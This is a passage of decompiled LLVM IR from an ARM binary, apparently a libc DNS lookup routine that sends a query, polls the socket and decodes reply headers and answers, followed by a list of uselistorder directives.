  %v5_105dc = call i32 @__libc_send(i32 %v0_1057c, i32* %v4_105dc, i32 %v2_105cc, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1057c, i32* %stack_var_-44, align 4
  %v11_10604 = call i32 @__libc_poll(%pollfd* %v10_10604, i32 1, i32 10000, i32 1, i32 %v0_1057c, i32 1, i32 0)
  %v1_10608 = load i32, i32* @r4, align 4
  %v7_1060c = icmp sgt i32 %v11_10604, %v1_10608
  br i1 %v7_1060c, label %dec_label_pc_10610, label %dec_label_pc_10918

dec_label_pc_10610:                               ; preds = %dec_label_pc_105cc
  %v0_10618 = load i32, i32* @r7, align 4
  %v4_10620 = inttoptr i32 %v0_10618 to i32*
  %v5_10620 = call i32 @__libc_recv(i32 %v0_1057c, i32* %v4_10620, i32 512, i32 %v1_10608)
  store i32 %v5_10620, i32* @fp, align 4
  %v7_1062c = icmp slt i32 %v5_10620, 12
  br i1 %v7_1062c, label %dec_label_pc_1094c, label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %dec_label_pc_10610
  %v0_10630 = load i32, i32* @r7, align 4
  %v2_10638 = inttoptr i32 %v0_10630 to i8*
  %v3_10638 = call i32 @__decode_header(i8* %v2_10638, i32 %v2_103e4)
  %v3_1063c = load i8, i8* %stack_var_-188, align 1
  %v4_1063c = sext i8 %v3_1063c to i32
  store i32 %v4_1063c, i32* @r6, align 4
  %v1_10640 = load i32, i32* @sb, align 4
  %v9_10640 = icmp eq i32 %v4_1063c, %v1_10640
  br i1 %v9_10640, label %dec_label_pc_10648, label %dec_label_pc_1094c

dec_label_pc_10648:                               ; preds = %dec_label_pc_10630
  %v1_1064c = load i32, i32* @r4, align 4
  %v9_1064c = icmp eq i32 %tmp157, %v1_1064c
  br i1 %v9_1064c, label %dec_label_pc_1094c, label %dec_label_pc_10654

dec_label_pc_10654:                               ; preds = %dec_label_pc_10648
  br i1 %v7_10658, label %dec_label_pc_10660, label %dec_label_pc_106dc

dec_label_pc_10660:                               ; preds = %dec_label_pc_10654
  %v9_10664 = icmp eq i32 %., %v1_1064c
  br i1 %v9_10664, label %dec_label_pc_1066c, label %dec_label_pc_106d0

dec_label_pc_1066c:                               ; preds = %dec_label_pc_10660
  store i32 %v2_10348, i32* @r5, align 4
  store i32 %v2_10348, i32* @r0, align 4
  %v1_10684 = call i32 @__pthread_return_void()
  %v1_10694 = call i32 @__pthread_return_0()
  store i32 %v2_10348, i32* @r0, align 4
  %v2_106a0 = load i32, i32* @global_var_1feb0.693, align 4
  %v1_106b0 = call i32 @__pthread_return_void()
  %v1_106b8 = add i32 %v2_106a0, -1
  store i32 %v1_106b8, i32* @r4, align 4
  %v5_106c0 = icmp slt i32 %v6_109ac, %v1_106b8
  br i1 %v5_106c0, label %.thread19, label %dec_label_pc_106d0

.thread19:                                        ; preds = %dec_label_pc_1066c
  %v7_106c0 = add i32 %v6_109ac, 1
  %v6_106c4 = load i32, i32* @r6, align 4
  store i32 %v6_106c4, i32* @sb, align 4
  br label %dec_label_pc_109e8.outer.backedge

dec_label_pc_106d0:                               ; preds = %dec_label_pc_1066c, %dec_label_pc_10660
  %v0_106d0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10700

dec_label_pc_106dc:                               ; preds = %dec_label_pc_10654
  br i1 %v2_106dc, label %dec_label_pc_106e4, label %dec_label_pc_1094c

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106dc
  br i1 %tmp198, label %dec_label_pc_106f8, label %dec_label_pc_10710.preheader

dec_label_pc_10710.preheader:                     ; preds = %dec_label_pc_106e4
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_10710

dec_label_pc_106f8:                               ; preds = %dec_label_pc_106e4
  %v0_106f8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10700

dec_label_pc_10700:                               ; preds = %dec_label_pc_106d0, %dec_label_pc_106f8
  %storemerge4 = phi i32 [ %v0_106f8, %dec_label_pc_106f8 ], [ %v0_106d0, %dec_label_pc_106d0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_106f8 ], [ 1, %dec_label_pc_106d0 ]
  %v2_10700 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_10700, align 4
  br label %dec_label_pc_10a14

dec_label_pc_10708:                               ; preds = %dec_label_pc_10710
  %v2_10708 = call i32 @__length_question(i32 %v0_1071c, i32 %v0_10718)
  %v0_1070c = load i32, i32* @r5, align 4
  %v2_1070c = add i32 %v0_1070c, %v2_10708
  store i32 %v2_1070c, i32* @r5, align 4
  %v0_10714.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %dec_label_pc_10710.preheader, %dec_label_pc_10708
  %v0_10718 = phi i32 [ 12, %dec_label_pc_10710.preheader ], [ %v2_1070c, %dec_label_pc_10708 ]
  %v0_10720 = phi i32 [ 0, %dec_label_pc_10710.preheader ], [ %v0_10714.pre, %dec_label_pc_10708 ]
  store i32 %v0_10718, i32* @r1, align 4
  %v0_1071c = load i32, i32* @r7, align 4
  store i32 %v0_1071c, i32* @r0, align 4
  %v1_10720 = add i32 %v0_10720, 1
  store i32 %v1_10720, i32* @r4, align 4
  %v5_10724 = icmp slt i32 %v0_10720, 1
  br i1 %v5_10724, label %dec_label_pc_10708, label %dec_label_pc_10728

dec_label_pc_10728:                               ; preds = %dec_label_pc_10710
  br label %dec_label_pc_10884

dec_label_pc_1073c:                               ; preds = %bb205
  store i32 %v2_1073c, i32* @r4, align 4
  %v0_10740 = load i32, i32* @r7, align 4
  %v0_10748 = load i32, i32* @fp, align 4
  %v5_10750 = call i32 @__decode_answer(i32 %v0_10740, i32 %v0_10744, i32 %v0_10748, i32* nonnull %stack_var_-140)
  %v1_10754 = icmp slt i32 %v5_10750, 0
  br i1 %v1_10754, label %dec_label_pc_10760, label %dec_label_pc_1077c

dec_label_pc_10760:                               ; preds = %dec_label_pc_1073c
  %v2_10764 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_10764, label %dec_label_pc_1094c, label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10760
  br i1 %v2_10770, label %dec_label_pc_1094c, label %dec_label_pc_10898

dec_label_pc_1077c:                               ; preds = %dec_label_pc_1073c
  %v2_10780 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_10780, label %dec_label_pc_10824, label %dec_label_pc_10788

dec_label_pc_10788:                               ; preds = %dec_label_pc_1077c
  %v0_10788 = load i32, i32* @r8, align 4
  %v3_1078c = add i32 %v0_10788, 32
  %v4_1078c = inttoptr i32 %v3_1078c to i32*
  %v5_1078c = load i32, i32* %v4_1078c, align 4
  store i32 %v5_1078c, i32* @ip, align 4
  %v6_1078c = add i32 %v0_10788, 36
  %v7_1078c = inttoptr i32 %v6_1078c to i32*
  %v8_1078c = load i32, i32* %v7_1078c, align 4
  store i32 %v8_1078c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1073c, i32* @r1, align 4
  store i32 %v0_10788, i32* @r0, align 4
  %v0_107a8 = call i32 @memcpy()
  %v0_107ac = load i32, i32* @r8, align 4
  %v1_107ac = add i32 %v0_107ac, 4
  %v2_107ac = inttoptr i32 %v1_107ac to i32*
  %v3_107ac = load i32, i32* %v2_107ac, align 4
  %v7_107b0 = icmp eq i32 %v3_107ac, 24
  br i1 %v7_107b0, label %dec_label_pc_107d4, label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %dec_label_pc_10788
  %v1_107b8 = add i32 %v0_107ac, 28
  %v2_107b8 = inttoptr i32 %v1_107b8 to i32*
  %v3_107b8 = load i32, i32* %v2_107b8, align 4
  %v2_107bc = icmp eq i32 %v3_107b8, 0
  br i1 %v2_107bc, label %dec_label_pc_10898, label %dec_label_pc_107c4

dec_label_pc_107c4:                               ; preds = %dec_label_pc_107b8
  br i1 %v7_107c8, label %dec_label_pc_107d4, label %bb203

bb203:                                            ; preds = %dec_label_pc_107c4
  br i1 %v8_107cc, label %dec_label_pc_107d4, label %dec_label_pc_10898

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107c4, %bb203, %dec_label_pc_10788
  %v9_107d8 = icmp eq i32 %v3_107ac, %arg2
  br i1 %v9_107d8, label %dec_label_pc_107ec, label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %dec_label_pc_107d4
  %v1_107e0 = inttoptr i32 %v0_107ac to i32*
  %v2_107e0 = load i32, i32* %v1_107e0, align 4
  store i32 %v2_107e0, i32* @r0, align 4
  %v0_107e4 = call i32 @free()
  br label %dec_label_pc_10870

dec_label_pc_107ec:                               ; preds = %dec_label_pc_107d4
  %v1_107f4 = add i32 %v0_107ac, 16
  %v2_107f4 = inttoptr i32 %v1_107f4 to i32*
  %v3_107f4 = load i32, i32* %v2_107f4, align 4
  %v2_107f8 = sub i32 %tmp155, %stack_var_-192.0
  %v1_107fc = add i32 %v2_107f8, -1
  %v1_10800 = add i32 %v3_107f4, 4
  %v2_10804 = mul i32 %v1_10800, %v1_107fc
  %v1_10808 = add i32 %v0_107ac, 32
  %v2_10808 = inttoptr i32 %v1_10808 to i32*
  %v3_10808 = load i32, i32* %v2_10808, align 4
  %v2_10810 = add i32 %v0_107ac, 36
  %v3_10810 = inttoptr i32 %v2_10810 to i32*
  store i32 %v1_107fc, i32* %v3_10810, align 4
  %tmp294 = icmp ugt i32 %v2_10804, %v3_10808
  br i1 %tmp294, label %dec_label_pc_10898, label %dec_label_pc_107ec.dec_label_pc_1086c_crit_edge

dec_label_pc_107ec.dec_label_pc_1086c_crit_edge:  ; preds = %dec_label_pc_107ec
  %v1_1086c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1086c

dec_label_pc_10824:                               ; preds = %dec_label_pc_1077c
  %v3_10824 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_10824, i32* @r0, align 4
  %v0_10828 = call i32 @free()
  br i1 %v9_10834, label %dec_label_pc_1083c, label %dec_label_pc_10870

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10824
  %v0_1083c = load i32, i32* @r8, align 4
  %v1_1083c = add i32 %v0_1083c, 16
  %v2_1083c = inttoptr i32 %v1_1083c to i32*
  %v3_1083c = load i32, i32* %v2_1083c, align 4
  %v9_10844 = icmp eq i32 %v3_1083c, %tmp146
  br i1 %v9_10844, label %dec_label_pc_1084c, label %dec_label_pc_10944

dec_label_pc_1084c:                               ; preds = %dec_label_pc_1083c
  %v1_1084c = add i32 %v0_1083c, 36
  %v2_1084c = inttoptr i32 %v1_1084c to i32*
  %v3_1084c = load i32, i32* %v2_1084c, align 4
  %v1_10850 = add i32 %v0_1083c, 28
  %v2_10850 = inttoptr i32 %v1_10850 to i32*
  %v3_10850 = load i32, i32* %v2_10850, align 4
  %v3_10854 = mul i32 %v3_1084c, %tmp146
  %v4_10854 = add i32 %v3_10850, %v3_10854
  store i32 %v4_10854, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_10860 = call i32 @memcpy()
  %v0_10864 = load i32, i32* @r8, align 4
  %v1_10864 = add i32 %v0_10864, 36
  %v2_10864 = inttoptr i32 %v1_10864 to i32*
  %v3_10864 = load i32, i32* %v2_10864, align 4
  %v1_10868 = add i32 %v3_10864, 1
  br label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_107ec.dec_label_pc_1086c_crit_edge, %dec_label_pc_1084c
  %v1_1086c = phi i32 [ %v0_10864, %dec_label_pc_1084c ], [ %v1_1086c.pre, %dec_label_pc_107ec.dec_label_pc_1086c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_10868, %dec_label_pc_1084c ], [ 0, %dec_label_pc_107ec.dec_label_pc_1086c_crit_edge ]
  %v2_1086c = add i32 %v1_1086c, 36
  %v3_1086c = inttoptr i32 %v2_1086c to i32*
  store i32 %storemerge5, i32* %v3_1086c, align 4
  br label %dec_label_pc_10870

dec_label_pc_10870:                               ; preds = %dec_label_pc_10824, %dec_label_pc_107e0, %dec_label_pc_1086c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1086c ], [ 0, %dec_label_pc_10824 ], [ %stack_var_-212.2, %dec_label_pc_107e0 ]
  %v1_10878 = add i32 %stack_var_-192.0, 1
  %v0_10880 = load i32, i32* @r5, align 4
  %v2_10880 = add i32 %v0_10880, %v5_10750
  store i32 %v2_10880, i32* @r5, align 4
  br label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %dec_label_pc_10728, %dec_label_pc_10870
  %v0_10744 = phi i32 [ %v0_10718, %dec_label_pc_10728 ], [ %v2_10880, %dec_label_pc_10870 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_10728 ], [ %stack_var_-212.1, %dec_label_pc_10870 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_10728 ], [ %v1_10878, %dec_label_pc_10870 ]
  %v2_1088c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1088c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1088c = xor i32 %v2_1088c, %stack_var_-192.0
  %v6_1088c = and i32 %v5_1088c, %v4_1088c
  %v5_10890 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_10890, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_10884
  %v7_10890 = load i32, i32* @fp, align 4
  %v8_10890 = sub i32 %v0_10744, %v7_10890
  %v10_10890 = xor i32 %v7_10890, %v0_10744
  %v11_10890 = xor i32 %v8_10890, %v0_10744
  %v12_10890 = and i32 %v11_10890, %v10_10890
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_10884, %bb204
  %v1_10894.in = phi i32 [ %v6_1088c, %dec_label_pc_10884 ], [ %v12_10890, %bb204 ]
  %v0_10894.in = phi i32 [ %v2_1088c, %dec_label_pc_10884 ], [ %v8_10890, %bb204 ]
  %v0_10894 = icmp slt i32 %v0_10894.in, 0
  %v1_10894 = icmp slt i32 %v1_10894.in, 0
  %v2_10894 = xor i1 %v1_10894, %v0_10894
  br i1 %v2_10894, label %dec_label_pc_1073c, label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_1076c, %bb203, %dec_label_pc_107ec, %dec_label_pc_107b8, %bb205
  %v1_1089c = call i32 @__libc_close(i32 %v0_1057c)
  %v3_108a0 = load i32, i32* %stack_var_0, align 4
  %v2_108a4 = icmp eq i32 %v3_108a0, 0
  br i1 %v2_108a4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_10898
  %v1_108ac = load i32, i32* @r7, align 4
  %v3_108a8 = inttoptr i32 %v3_108a0 to i32*
  store i32 %v1_108ac, i32* %v3_108a8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_10898
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 67764, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_108a4, i32 ptrtoint (i32* @global_var_d4a4.412 to i32))
  %v2_108b4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_108b4, i32* @r0, align 4
  store i32 %v2_10348, i32* @r4, align 4
  %v0_108bc = call i32 @free()
  store i32 %v2_10348, i32* @r0, align 4
  %v1_108d4 = call i32 @__pthread_return_void()
  %v1_108e4 = call i32 @__pthread_return_0()
  %v0_108f0 = load i32, i32* @r6, align 4
  %v3_108f0 = sdiv i32 %v0_108f0, 256
  store i32 %v3_108f0, i32* @ip, align 4
  %v0_108f4 = load i32, i32* @sl, align 4
  store i32 %v0_108f4, i32* @global_var_1fe48.685, align 4
  store i32 %v2_10348, i32* @r0, align 4
  %v1_10900 = trunc i32 %v3_108f0 to i8
  store i8 %v1_10900, i8* @global_var_1d7b1.688, align 1
  %v1_10904 = trunc i32 %v0_108f0 to i8
  store i8 %v1_10904, i8* bitcast (i8** @global_var_1d7b0.687 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_10914.699 to i32), i32* @lr, align 4
  %v1_10910 = call i32 @__pthread_return_void()
  %v0_10a9c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_10a9c

dec_label_pc_10918:                               ; preds = %dec_label_pc_105ac, %dec_label_pc_105cc
  %v0_10918 = load i32, i32* @sl, align 4
  %v1_10918 = add i32 %v0_10918, 1
  %v2_10920 = srem i32 %v1_10918, %arg3
  store i32 %v2_10920, i32* @sl, align 4
  %v2_10924 = icmp eq i32 %v2_10920, 0
  br i1 %v2_10924, label %dec_label_pc_1092c, label %dec_label_pc_109e4.backedge

dec_label_pc_1092c:                               ; preds = %dec_label_pc_10918
  %v1_10934 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_109e8.outer.backedge

dec_label_pc_109e8.outer.backedge:                ; preds = %dec_label_pc_1092c, %dec_label_pc_109c8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_106c0, %.thread19 ], [ -1, %dec_label_pc_109c8 ], [ -1, %dec_label_pc_1092c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_109d0, %dec_label_pc_109c8 ], [ %v1_10934, %dec_label_pc_1092c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_103cc.lr.ph, label %dec_label_pc_10a04

dec_label_pc_10944:                               ; preds = %dec_label_pc_1083c
  %v1_10944 = inttoptr i32 %v0_1083c to i32*
  %v2_10944 = load i32, i32* %v1_10944, align 4
  store i32 %v2_10944, i32* @r0, align 4
  %v0_10948 = call i32 @free()
  br label %dec_label_pc_1094c

dec_label_pc_1094c:                               ; preds = %dec_label_pc_106dc, %dec_label_pc_10630, %dec_label_pc_1076c, %dec_label_pc_10760, %dec_label_pc_10648, %dec_label_pc_10610, %dec_label_pc_10944
  br i1 %v2_10950, label %dec_label_pc_10958, label %dec_label_pc_109b4

dec_label_pc_10958:                               ; preds = %dec_label_pc_1094c
  store i32 %v2_10348, i32* @r5, align 4
  store i32 %v2_10348, i32* @r0, align 4
  %v1_10970 = call i32 @__pthread_return_void()
  %v1_10980 = call i32 @__pthread_return_0()
  %v2_1098c = load i32, i32* @global_var_1feb0.693, align 4
  store i32 %v2_10348, i32* @r0, align 4
  %v1_1099c = call i32 @__pthread_return_void()
  %v1_109a4 = add i32 %v2_1098c, -1
  store i32 %v1_109a4, i32* @r4, align 4
  %v5_109ac = icmp slt i32 %v6_109ac, %v1_109a4
  br i1 %v5_109ac, label %.thread27, label %dec_label_pc_109b4

.thread27:                                        ; preds = %dec_label_pc_10958
  %v7_109ac = add i32 %v6_109ac, 1
  br label %dec_label_pc_109e4.backedge

dec_label_pc_109b4:                               ; preds = %dec_label_pc_10958, %dec_label_pc_1094c
  %v0_109b4 = load i32, i32* @sl, align 4
  %v1_109b4 = add i32 %v0_109b4, 1
  %v2_109bc = srem i32 %v1_109b4, %arg3
  store i32 %v2_109bc, i32* @sl, align 4
  %v2_109c0 = icmp eq i32 %v2_109bc, 0
  br i1 %v2_109c0, label %dec_label_pc_109c8, label %dec_label_pc_109e4.backedge

dec_label_pc_109c8:                               ; preds = %dec_label_pc_109b4
  %v1_109d0 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_109e8.outer.backedge

dec_label_pc_109e4.backedge:                      ; preds = %dec_label_pc_10918, %dec_label_pc_109b4, %.thread27
  %storemerge87 = phi i32 [ %v7_109ac, %.thread27 ], [ -1, %dec_label_pc_109b4 ], [ -1, %dec_label_pc_10918 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_103cc.lr.ph.preheader, label %dec_label_pc_10a04

dec_label_pc_103cc.lr.ph.preheader:               ; preds = %dec_label_pc_103cc.lr.ph.preheader.lr.ph, %dec_label_pc_109e4.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_103cc.lr.ph.preheader.lr.ph ], [ %v0_1057c, %dec_label_pc_109e4.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_103c4, %dec_label_pc_103cc.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_109e4.backedge ]
  %v0_109e4259 = phi i32 [ -1, %dec_label_pc_103cc.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_109e4.backedge ]
  br label %dec_label_pc_103cc.lr.ph

dec_label_pc_103cc.lr.ph:                         ; preds = %dec_label_pc_103cc.lr.ph.preheader, %dec_label_pc_109e8.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_1057c, %dec_label_pc_109e8.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_103cc.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_109e8.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_103cc.lr.ph.preheader ]
  %v6_109ac = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_109e8.outer.backedge ], [ %v0_109e4259, %dec_label_pc_103cc.lr.ph.preheader ]
  %v1_10474 = icmp slt i32 %v6_109ac, 0
  %v4_104b0 = mul i32 %v6_109ac, 4
  %v5_104b0 = add i32 %v4_104b0, ptrtoint (i32* @global_var_1fe90.697 to i32)
  %v6_104b0 = inttoptr i32 %v5_104b0 to i32*
  br label %dec_label_pc_103cc

dec_label_pc_109f8:                               ; preds = %bb195, %.thread8, %dec_label_pc_10324, %dec_label_pc_10318
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_10a04

dec_label_pc_10a04:                               ; preds = %dec_label_pc_10334, %dec_label_pc_109e4.backedge, %dec_label_pc_109e8.outer.backedge, %bb200, %dec_label_pc_104bc, %dec_label_pc_109e8.backedge, %dec_label_pc_109f8
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_109f8 ], [ %v0_1057c, %dec_label_pc_109e8.backedge ], [ %v1_103d4, %dec_label_pc_104bc ], [ %v1_103d4, %bb200 ], [ %v0_1057c, %dec_label_pc_109e8.outer.backedge ], [ -1, %dec_label_pc_10334 ], [ %v0_1057c, %dec_label_pc_109e4.backedge ]
  %v0_10a04 = call i32 @__GI___h_errno_location()
  %v2_10a0c = inttoptr i32 %v0_10a04 to i32*
  store i32 -1, i32* %v2_10a0c, align 4
  %v0_10a10 = load i32, i32* @sb, align 4
  store i32 %v0_10a10, i32* @r6, align 4
  br label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_10700, %dec_label_pc_10a04
  %v1_10a1c = phi i32 [ %stack_var_-216.2, %dec_label_pc_10a04 ], [ %v0_1057c, %dec_label_pc_10700 ]
  %v7_10a18 = icmp eq i32 %v1_10a1c, -1
  br i1 %v7_10a18, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_10a14
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_10a14, %bb208
  store i32 68132, i32* @lr, align 4
  %v1_10a20 = xor i1 %v7_10a18, true
  call void @__pseudo_cond_branch(i1 %v1_10a20, i32 ptrtoint (i32* @global_var_a9f4.690 to i32))
  %v2_10a24 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_10a24, i32* @r0, align 4
  %v0_10a28 = call i32 @free()
  %v0_10a2c = load i32, i32* @r7, align 4
  store i32 %v0_10a2c, i32* @r0, align 4
  %v0_10a30 = call i32 @free()
  %v0_10a34 = load i32, i32* @sl, align 4
  %v7_10a34 = icmp eq i32 %v0_10a34, -1
  br i1 %v7_10a34, label %bb210, label %dec_label_pc_10a40

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_10a9c

dec_label_pc_10a40:                               ; preds = %bb209
  %v2_10a40 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10a40, i32* @r0, align 4
  %v1_10a58 = call i32 @__pthread_return_void()
  %v1_10a68 = call i32 @__pthread_return_0()
  %v0_10a74 = load i32, i32* @r6, align 4
  %v3_10a74 = sdiv i32 %v0_10a74, 256
  store i32 %v3_10a74, i32* @ip, align 4
  %v0_10a78 = load i32, i32* @sl, align 4
  store i32 %v0_10a78, i32* @global_var_1fe48.685, align 4
  store i32 %v2_10a40, i32* @r0, align 4
  %v1_10a84 = trunc i32 %v3_10a74 to i8
  store i8 %v1_10a84, i8* @global_var_1d7b1.688, align 1
  %v1_10a88 = trunc i32 %v0_10a74 to i8
  store i8 %v1_10a88, i8* bitcast (i8** @global_var_1d7b0.687 to i8*), align 4
  store i32 68248, i32* @lr, align 4
  %v1_10a94 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %bb210, %bb207, %dec_label_pc_10a40
  %v0_10a9c = phi i32 [ %v0_10a34, %bb210 ], [ %v0_10a9c.pre, %bb207 ], [ -1, %dec_label_pc_10a40 ]
  store i32 %v3_102d0, i32* @r4, align 4
  store i32 %v6_102d0, i32* @r5, align 4
  store i32 %v9_102d0, i32* @r6, align 4
  store i32 %v12_102d0, i32* @r7, align 4
  store i32 %v15_102d0, i32* @r8, align 4
  store i32 %v18_102d0, i32* @sb, align 4
  store i32 %v21_102d0, i32* @sl, align 4
  ret i32 %v0_10a9c

; uselistorder directives
  uselistorder i32 %v3_10a74, { 1, 0 }
  uselistorder i32 %v0_10a74, { 1, 0 }
  uselistorder i32 %v0_10a34, { 1, 0 }
  uselistorder i1 %v7_10a18, { 1, 0 }
  uselistorder i32 %v6_109ac, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v3_108f0, { 1, 0 }
  uselistorder i32 %v0_108f0, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_10744, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1083c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_107fc, { 1, 0 }
  uselistorder i32 %v0_1071c, { 1, 0 }
  uselistorder i32 %v0_10720, { 1, 0 }
  uselistorder i32 %v5_10620, { 1, 0 }
  uselistorder i32 %v0_1057c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_104e8, { 1, 0 }
  uselistorder i32 %v2_10488, { 1, 0 }
  uselistorder i32 %v1_10400, { 1, 2, 0 }
  uselistorder i1 %v7_103d0, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_103d4, { 1, 2, 0 }
  uselistorder i32 %v0_103c4, { 1, 0 }
  uselistorder i32 %v2_10348, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 0, 1, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_recv, { 2, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 2, 0, 1 }
  uselistorder i32 ()* @socket, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 3, 2, 1, 4, 0 }
  uselistorder i8* @global_var_1d7b1.688, { 2, 1, 0 }
  uselistorder i32 512, { 3, 4, 2, 5, 1, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_10a9c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_10a14, { 1, 0 }
  uselistorder label %dec_label_pc_10a04, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_109f8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_103cc.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_109e4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1094c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_109e8.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10918, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_10898, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_10884, { 1, 0 }
  uselistorder label %dec_label_pc_10870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1086c, { 1, 0 }
  uselistorder label %dec_label_pc_107d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10710, { 1, 0 }
  uselistorder label %dec_label_pc_10700, { 1, 0 }
  uselistorder label %dec_label_pc_109e8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10568, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_104bc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
